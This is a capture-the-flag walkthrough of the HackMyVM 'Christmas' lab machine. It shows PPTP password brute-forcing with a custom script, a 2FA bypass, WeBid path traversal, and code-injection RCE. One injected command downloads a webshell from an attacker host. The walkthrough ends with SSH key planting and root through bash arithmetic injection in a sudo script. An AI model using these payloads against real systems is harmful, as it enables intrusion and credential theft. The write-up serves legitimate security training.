# Christmas

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.125:22
Open 10.0.2.125:80
Open 10.0.2.125:1723
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.125
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp   open  http    syn-ack Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Massively by HTML5 UP
| http-robots.txt: 4 disallowed entries 
|_/ /webid /images /assets
|_http-server-header: Apache/2.4.57 (Debian)
1723/tcp open  pptp    syn-ack linux (Firmware: 1)
Service Info: Host: local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (Recon)

![writeup.png](/assets/pentest/hackmyvm/christmas/writeup.png)

`robots.txt` shows `/webid` route, it's Login Form protected. SQLi didn't seem to work.

![writeup-1.png](/assets/pentest/hackmyvm/christmas/writeup-1.png)

```bash
â””â”€$ feroxbuster -u http://10.0.2.125/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET      258l      507w     5346c http://10.0.2.125/assets/js/main.js
200      GET        2l       52w     2051c http://10.0.2.125/assets/js/browser.min.js
200      GET        2l       37w     2257c http://10.0.2.125/assets/js/jquery.scrollex.min.js
200      GET      222l      705w     8958c http://10.0.2.125/index.php
200      GET      587l     1232w    12433c http://10.0.2.125/assets/js/util.js
301      GET        9l       28w      309c http://10.0.2.125/assets => http://10.0.2.125/assets/
200      GET        2l     1294w    89501c http://10.0.2.125/assets/js/jquery.min.js
200      GET      126l      542w     5909c http://10.0.2.125/generic.php
200      GET        2l       23w      831c http://10.0.2.125/assets/js/jquery.scrolly.min.js
200      GET      498l     1812w    22063c http://10.0.2.125/elements.php
200      GET        2l       87w     2439c http://10.0.2.125/assets/js/breakpoints.min.js
200      GET      222l      705w     8958c http://10.0.2.125/
301      GET        9l       28w      309c http://10.0.2.125/images => http://10.0.2.125/images/
200      GET       66l      119w     2092c http://10.0.2.125/login.php
200      GET        5l       10w       79c http://10.0.2.125/robots.txt
```

Hmmm... we don't even have a username so I don't think brute force is the way here.

## Point-to-Point Tunneling Protocol (PPTP)

- [https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/1723-pentesting-pptp](https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/1723-pentesting-pptp)
- [https://blog.1nf1n1ty.team/hacktricks/generic-methodologies-and-resources/brute-force#pptp](https://blog.1nf1n1ty.team/hacktricks/generic-methodologies-and-resources/brute-force#pptp)

The mentioned package doesn't seem to work, it fails frequently.
```bash
â””â”€$ cat $rockyou | sudo thc-pptp-bruter -u admin 10.0.2.125
```

We can use something like `pptpsetup` to bruteforce the password
- [https://wiki.archlinux.org/title/PPTP_Client](https://wiki.archlinux.org/title/PPTP_Client)

or even better with `pppd` since we can provide custom `chap-secrets` file on each try
```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <server> <username> <wordlist>"
    echo "Example: $0 10.0.2.125 admin passwords.txt"
    exit 1
fi

SERVER="$1"
USER="$2"
WORDLIST="$3"

count=0
while read -r password; do
    count=$((count + 1))
    printf "\r[%3d] Testing: %-30s" "$count" "$password"
    
    TMP=$(mktemp -t "pppd.$password.XXXXX")
    echo "$USER pptp-test $password *" > "$TMP"
    
    OUT=$(pppd pty "pptp $SERVER --nolaunchpppd" name "$USER" remotename pptp-test chap-secrets "$TMP" file /etc/ppp/options.pptp nodetach 2>/dev/null)
    
    rm -f "$TMP"
    
    if ! echo "$OUT" | grep -q "Access denied"; then
        echo -e "\nFound: $password"
        exit 0
    fi
done < "$WORDLIST"

echo -e "\nNot found"
```

> **Note**: Make sure to run as root!

```bash
â””â”€$ sudo brute_pptp.sh 10.0.2.125 admin $rockyou
[100] Testing: princesa
Found: princesa
```

Setup interface
```bash
â””â”€$ sudo pptpsetup --create christmas_vpn --server 10.0.2.125 --username admin --password "princesa" --encrypt --start
Using interface ppp0
Connect: ppp0 <--> /dev/pts/2
CHAP authentication succeeded
MPPE 128-bit stateless compression enabled
local  LL address fe80::d069:2e2a:09b2:3f04
remote LL address fe80::6475:d4f7:f0db:9b8b
```

```bash
â””â”€$ ip -brief a s ppp0
ppp0             UNKNOWN        192.168.3.100 peer 192.168.3.1/32 fe80::d069:2e2a:9b2:3f04 peer fe80::6475:d4f7:f0db:9b8b/128
```

## FTP (Internal)

```bash
â””â”€$ sudo nmap -sS -T5 -p- -vvv 192.168.3.1
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack ttl 64
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 64
1723/tcp  open  pptp       syn-ack ttl 64
8384/tcp  open  marathontp syn-ack ttl 64
22000/tcp open  snapenetio syn-ack ttl 64
```

```bash
â””â”€$ ftp anonymous@192.168.3.1
Connected to 192.168.3.1.
220 Welcome to the christmas.hmv FTP server. Please note that the primary FTP directory is located at /srv/ftp. All activities on this server are monitored and logged. Ensure compliance with our terms of use. Enjoy your session!
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

â””â”€$ ftp admin@192.168.3.1
Connected to 192.168.3.1.
220 Welcome to the christmas.hmv FTP server. Please note that the primary FTP directory is located at /srv/ftp. All activities on this server are monitored and logged. Ensure compliance with our terms of use. Enjoy your session!
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```

Unsuccessful logins, however we have a host name.

Sometimes the VPN just dropped dead, update config
```bash
â””â”€$ sudo nano /etc/ppp/options.pptp
...
persist # reconnect forever
maxfail 0 # don't stop after failed auth
holdoff 5 # wait 5 seconds between reconnection attempts
lcp-echo-interval 20  # detect dead/timed-out links and reconnect
lcp-echo-failure 3  # detect dead/timed-out links and reconnect
```

Reconnect
```bash
â””â”€$ sudo pon christmas_vpn
```

> **Note**: Duplicate connection names in `chap-secrets` will interfere with each other. (Correct + Incorrect=Incorrect creds)

## SyncThing (Internal)

![writeup-2.png](/assets/pentest/hackmyvm/christmas/writeup-2.png)

Perfect, no password means we can (probably) sync anything, but we will need a syncthing client.

```bash
â””â”€$ curl -LOs https://github.com/syncthing/syncthing/releases/download/v2.0.12/syncthing-linux-amd64-v2.0.12.tar.gz
â””â”€$ tar -xvzf syncthing-linux-amd64-v2.0.12.tar.gz
â””â”€$ ./syncthing-linux-amd64-v2.0.12/syncthing
...
```

Connect devices, setup `/srv/ftp/` as first 

```bash
â””â”€$ ls -l backup.zip
Permissions Size User  Date Modified Name
.rw-r--r--  9.9M woyag 24 Dec  2023  ï backup.zip
```

```bash
â””â”€$ unzip backup.zip -d backup
```

Extract only PHP code
```bash
â””â”€$ awk '/<?php/{in_php=1; next} /?>/{in_php=0; next} in_php' login.php
session_start();

$usernameValid = "admin";
$passwordValid = "MyPassword1@2023*";

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username == $usernameValid && $password == $passwordValid) {
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;

        setcookie("UserAuthenticated", "true", time() + 3600, "/");

        exit;
    } else {
        echo "<p>Bad credentials.</p>";
    }
}
```

## HTTP (webid)

Credentials are valid, however there's 2FA checking and backup doesn't have this file.

![writeup-3.png](/assets/pentest/hackmyvm/christmas/writeup-3.png)

`/webid/` keeps redirecting to `/login.php`

It's an open source project

![writeup-4.png](/assets/pentest/hackmyvm/christmas/writeup-4.png)

- [https://github.com/renlok/WeBid](https://github.com/renlok/WeBid)
- [http://christmas.hmv/webid/bid.php](http://christmas.hmv/webid/bid.php) -> [http://christmas.hmv/webid/user_login.php](http://christmas.hmv/webid/user_login.php)

Can't login as user

There's also admin login
- [http://christmas.hmv/webid/admin/login.php](http://christmas.hmv/webid/admin/login.php)

But still redirects...

When using login form a `Referrer` header is added
```js
fetch("http://christmas.hmv/login.php", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "/2fa.php",
  "body": "username=admin&password=MyPassword1%402023*",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

Add this header to every request (Extension: ModHeader)

![writeup-5.png](/assets/pentest/hackmyvm/christmas/writeup-5.png)

```bash
MyPassword1@2023* # Incorrect
MyPassword1@2024* # Incorrect
MyPassword1@2025* # Incorrect
MyPassword2@2023* # Correct
```

![writeup-6.png](/assets/pentest/hackmyvm/christmas/writeup-6.png)

### LFI

- [A security issue was discovered in WeBid <=1.2.2. A Server-Side Request Forgery (SSRF) vulnerability in the admin/theme.php file allows remote attackers to inject payloads via theme parameters to read files across directories.](https://github.com/advisories/GHSA-2g36-547g-jq4m)
- [A Path Traversal vulnerability inÂ `file_get_contents`Â Function ofÂ `/admin/theme.php`Â File WeBid 1.2.2 version](https://github.com/zer0yu/CVE_Request/blob/master/Webid/WeBid_Path_Traversal.md)

```bash
â””â”€$ curl 'http://christmas.hmv/webid/admin/theme.php' -b 'uniqueuser=1765179767; CSRF-Token-X3SKS=qtmU3wnPtcaqtWS2eidALsC3vMKW6D95; PHPSESSID=0g858ohun2leq5tbqdj8g0la1i; UserAuthenticated=true' -d 'file=passwd&theme=/../../../../../../../../../../../etc&csrftoken=a1fb1e1445c7ca12e985a0fde947a16c' -H 'Referer: /2fa.php' -s | htmlq 'textarea[name="content"]' -t | grep sh$
root:x:0:0:root:/root:/usr/bin/zsh
mr-jack:x:1000:1000::/home/mr-jack:/bin/zsh
```

### RCE

- [https://www.cvedetails.com/cve/CVE-2023-47397/](https://www.cvedetails.com/cve/CVE-2023-47397/)
- [https://liotree.github.io/2023/webid.html](https://liotree.github.io/2023/webid.html)
- [https://web.archive.org/web/20231116080904/https://liotree.github.io/2023/webid.html](https://web.archive.org/web/20231116080904/https://liotree.github.io/2023/webid.html)

```bash
â””â”€$ curl 'http://christmas.hmv/webid/admin/categoriestrans.php?lang=..' -b 'uniqueuser=1765179767; CSRF-Token-X3SKS=qtmU3wnPtcaqtWS2eidALsC3vMKW6D95; PHPSESSID=0g858ohun2leq5tbqdj8g0la1i; UserAuthenticated=true' -H 'Referer: /2fa.php' -d 'categories[123);system("id");/*]=test' -s | head -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upload webshell
```bash
â””â”€$ curl 'http://christmas.hmv/webid/admin/categoriestrans.php?lang=..' -b 'uniqueuser=1765179767; CSRF-Token-X3SKS=qtmU3wnPtcaqtWS2eidALsC3vMKW6D95; PHPSESSID=0g858ohun2leq5tbqdj8g0la1i; UserAuthenticated=true' -H 'Referer: /2fa.php' -d 'categories[123);system("curl 10.0.2.15/shell.php -o /var/www/html/shell.php");/*]=test' -s | head -1
```


![writeup-7.png](/assets/pentest/hackmyvm/christmas/writeup-7.png)

```php
$ cat 2fa.php
<?php
session_start();

if (!isset($_SESSION['authenticated'])) {
    header('Location: login.php');
    exit;
}

if (isset($_POST['code'])) {
    if ($_POST['code'] === "9872234065358987654322346789876543") {
        $_SESSION['2fa_passed'] = true;

        setcookie("2FA_passed", "true", time() + 3600, "/");

        header('Location: ./webid/admin/login.php');
        exit;
    } else {
        echo "<p>Wrong 2FA code.</p>";
    }
}
?>
```

Some files are readable in `mr-jack`'s directory
```bash
www-data@christmas.hmv:/home/mr-jack# find . -type f -readable -ls | grep -v oh
   261143      4 -rw-r--r--   1 mr-jack  mr-jack       807 Dec 25  2023 ./.profile
   263069      4 -rwxr-xr-x   1 mr-jack  mr-jack      1073 Dec 25  2023 ./.config/.SecureGateway/firewall_config.conf
   263061    120 -r--r--r--   1 mr-jack  mr-jack    119920 Dec 25  2023 ./.zcompdump-debian-5.9.zwc
   263057     52 -rw-r--r--   1 mr-jack  mr-jack     51816 Nov 17  2023 ./.zcompdump-christmas-5.9
   261144      4 -rw-r--r--   1 mr-jack  mr-jack       220 Dec 25  2023 ./.bash_logout
   261145      4 -rw-r--r--   1 mr-jack  mr-jack      3890 Dec 25  2023 ./.zshrc
   263070    120 -r--r--r--   1 mr-jack  mr-jack    119928 Nov 17  2023 ./.zcompdump-christmas-5.9.zwc
   263051     52 -rw-r--r--   1 mr-jack  mr-jack     51816 Dec 25  2023 ./.zcompdump-debian-5.9
   263038      4 -rw-r--r--   1 mr-jack  mr-jack      3526 Dec 25  2023 ./.bashrc

www-data@christmas.hmv:/home/mr-jack# cat ./.config/.SecureGateway/firewall_config.conf
# Example Firewall Configuration File - firewall_config.conf
FirewallName = "ChristmasSecureGateway"
Manufacturer = "Christmas Technologies"
Model = "XMAS-FW1000"
FirmwareVersion = "2023.1"
ManagementInterface = "eth0"
ManagementIP = "192.168.100.1"
InternalInterface = "eth1"
InternalIPRange = "192.168.0.0/24"
ExternalInterface = "eth2"
ExternalIP = "203.0.113.5"
NAT = "Enabled"
ALLOW 192.168.0.0/24 Any IP Any
DENY Any Any IP 23
DENY Any Any IP 21
RDP 203.0.113.5:3389 -> 192.168.0.10:3389
HTTP 203.0.113.5:80 -> 192.168.0.20:80
VPNType = "OpenVPN"
VPNServerIP = "192.168.100.2"
VPNPort = 1194
Encryption = "AES-256-CBC"
WebInterface = "https://192.168.100.1:8080"
APIEndpoint = "https://192.168.100.1/api"
AdminPortalURL = "https://mr-jack:m3rrychr157m4523@192.168.100.1:8080/login"
SyslogServer = "192.168.100.10"
LogLevel = "Info"
AuditTrail = "Enabled"
IntrusionPreventionSystem = "Enabled"
AntiVirus = "Enabled"
AntiSpyware = "Enabled"
AutoUpdate = "Enabled"
UpdateServer = "https://update.christmas.hmv"
LastUpdateCheck = "2023-03-01"
# End of Configuration File
```

::: info Creds
`mr-jack:m3rrychr157m4523`
:::

Can't use password to login into SSH
```bash
www-data@christmas.hmv:/home/mr-jack# cat /etc/ssh/sshd_config | grep -vE '#|^$'
Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin yes
PasswordAuthentication no # <-
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server
```

However local `su` works
```bash
www-data@christmas.hmv:/home/mr-jack# echo "m3rrychr157m4523" | su - mr-jack -c id
Password: uid=1000(mr-jack) gid=1000(mr-jack) groups=1000(mr-jack)
```

## SSH

The user doesn't have SSH key, let's add it.
```bash
www-data@christmas.hmv:/home/mr-jack# echo "m3rrychr157m4523" | su - mr-jack -c 'ls -alh /home/mr-jack/.ssh'
Password: total 8.0K
drwx------ 2 mr-jack mr-jack 4.0K Nov 18  2023 .
drwxr-xr-x 6 mr-jack mr-jack 4.0K Nov 18  2023 ..
```

Local terminal
```bash
â””â”€$ ssh-keygen -f id_rsa -P x -q
â””â”€$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6TplrvhZUQ56I489+Ttvxu3r2LnjH/yr3xDbZNWXHb woyag@kraken' >> ~/.ssh/authorized_keys
```

In webshell
```bash
www-data@christmas.hmv:/home/mr-jack# echo "m3rrychr157m4523" | su - mr-jack -c "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6TplrvhZUQ56I489+Ttvxu3r2LnjH/yr3xDbZNWXHb woyag@kraken' >> ~/.ssh/authorized_keys"
```

```bash
â””â”€$ ssh -i id_rsa mr-jack@10.0.2.125
â•°â”€$ id
uid=1000(mr-jack) gid=1000(mr-jack) groups=1000(mr-jack)
```

### User.txt

```bash
â•°â”€$ cat user.txt
caf45c355c29186bb9d8ab89f7811bf0
```

## Privilege Escalation

```
â•°â”€$ sudo -l
Matching Defaults entries for mr-jack on christmas:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mr-jack may run the following commands on christmas:
    (ALL : ALL) NOPASSWD: /opt/GiftPursuit
```

```bash
â•°â”€$ cat /opt/GiftPursuit
#!/bin/bash

if [[ "$#" -eq 0 ]] ; then
  echo "ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„"
  echo -e "\nUsage: $0 number\n"
  echo "ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„"
  exit 1
fi

NUMBER=$(openssl rand -hex 45 |tr -dc "0-9" |head -c 40)

if [[ "${NUMBER}" -eq "${1}" ]] ; then
  echo "Here's your Christmas gift !"
  chmod o+s /bin/bash
else
  echo "No ! If you want a gift, try hard !"
  exit 1
fi
```

I don't exactly know then name of "vulnerability", but it's a built-in way in bash for arithmetical operation expansion. I think this explains better
- [Arithmetic operation in shell script can be exploited](https://dev.to/t/bash)

Basically the quotes are correct way to do the comparison, but when variables like `x[$(id)]` are expanded you get RCE, yet it's still a valid code.

```bash
â•°â”€$ sudo /opt/GiftPursuit 'x[$(id)]'
/opt/GiftPursuit: line 12: uid=0(root) gid=0(root) groups=0(root): syntax error in expression (error token is "(root) gid=0(root) groups=0(root)")
```

```bash
â•°â”€$ sudo /opt/GiftPursuit 'x[$(/bin/zsh -i <&2 >&2 2>&2)]'
â•°â”€# id
uid=0(root) gid=0(root) groups=0(root)
```

**Force the spawned bash shell to attach its input and output to your terminal through FD 2**, because FD 1 is swallowed by `$( â€¦ )` inside the arithmetic expression.
- `<&2`: Redirect **stdin** to come from stderr  
- `>&2`: Redirect **stdout â†’ stderr**  
- `2>&2`: Does nothing (stderr â†’ itself)  

SUID bash or reverse shell would have been simpler, but I wanted to spawn interactive shell from this process.

### Root.txt

```bash
â•°â”€# cat /root/root.txt
93ba7e97218f577271c3867abf31ae8a
```